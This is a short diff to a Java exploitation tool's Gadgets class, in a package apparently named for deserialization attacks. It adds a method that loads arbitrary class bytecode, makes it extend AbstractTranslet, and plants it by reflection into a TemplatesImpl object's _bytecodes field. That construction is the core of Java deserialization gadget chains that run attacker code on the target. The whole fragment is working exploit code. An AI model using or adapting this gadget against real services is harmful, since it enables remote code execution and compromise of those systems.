@@ -9,6 +9,7 @@ import com.summersec.attack.deser.echo.EchoPayload;
 import com.summersec.attack.deser.echo.EchoPayload.Utils;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
@@ -94,6 +95,26 @@ public class Gadgets {
         Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
         Reflections.setFieldValue(s, "table", tbl);
         return s;
+    }
+
+    public static Object createTemplatesImpl(byte[] classBytes) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.makeClass(new java.io.ByteArrayInputStream(classBytes));
+        CtClass superClass = pool.get(AbstractTranslet.class.getName());
+        if (!clazz.subclassOf(superClass)) {
+            clazz.setSuperclass(superClass);
+        }
+        byte[] fixed = clazz.toBytecode();
+        clazz.detach();
+
+        Object templates = TemplatesImpl.class.newInstance();
+        Field bcField = TemplatesImpl.class.getDeclaredField("_bytecodes");
+        bcField.setAccessible(true);
+        bcField.set(templates, new byte[][] { fixed });
+        Field nameField = TemplatesImpl.class.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates, "a");
+        return templates;
     }
 
     static {
